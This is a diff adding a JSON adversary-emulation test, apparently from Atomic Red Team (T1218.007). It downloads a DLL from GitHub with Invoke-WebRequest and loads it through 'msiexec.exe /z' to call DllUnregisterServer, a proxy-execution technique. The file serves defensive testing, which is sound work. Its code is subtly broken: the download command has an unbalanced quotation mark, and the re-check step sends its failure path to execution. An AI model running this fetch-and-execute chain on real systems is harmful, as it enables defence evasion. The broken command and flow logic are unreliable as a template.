@@ -1,0 +1,92 @@
+{
+  "id": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
+  "name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
+  "description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "0d8bdc51-5753-4601-adfb-0535f24e460d",
+      "type": "execute-command",
+      "data": {
+        "command": "#{msi_exe} /z \"#{dll_payload}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "75c53e05-923d-454a-8809-29676f6bb275",
+      "name": "Check dependency 1/1",
+      "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "dcf6c220-a007-451f-97b7-090bc7bf0714",
+      "name": "Resolve dependency 1/1",
+      "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{dll_payload}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/MSIRunner.dll -OutFile \"#{dll_payload}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c69e3a05-9e65-41a9-9d0c-a2321e08c01a",
+      "name": "Re-check dependency 1/1",
+      "description": "The DLL must exist on disk at specified location (#{dll_payload})\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{dll_payload}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "75c53e05-923d-454a-8809-29676f6bb275",
+      "p": "on-success",
+      "o": "0d8bdc51-5753-4601-adfb-0535f24e460d"
+    },
+    {
+      "s": "75c53e05-923d-454a-8809-29676f6bb275",
+      "p": "on-failure",
+      "o": "dcf6c220-a007-451f-97b7-090bc7bf0714"
+    },
+    {
+      "s": "dcf6c220-a007-451f-97b7-090bc7bf0714",
+      "p": "on-success",
+      "o": "c69e3a05-9e65-41a9-9d0c-a2321e08c01a"
+    },
+    {
+      "s": "c69e3a05-9e65-41a9-9d0c-a2321e08c01a",
+      "p": "on-failure",
+      "o": "0d8bdc51-5753-4601-adfb-0535f24e460d"
+    }
+  ],
+  "tags": [
+    "T1218.007",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "dll_payload",
+      "type": "path",
+      "description": "DLL to execute that has an implemented DllUnregisterServer function",
+      "value": "PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll"
+    },
+    {
+      "name": "msi_exe",
+      "type": "path",
+      "description": "MSIExec File Path",
+      "value": "c:\\windows\\system32\\msiexec.exe"
+    }
+  ]
+}
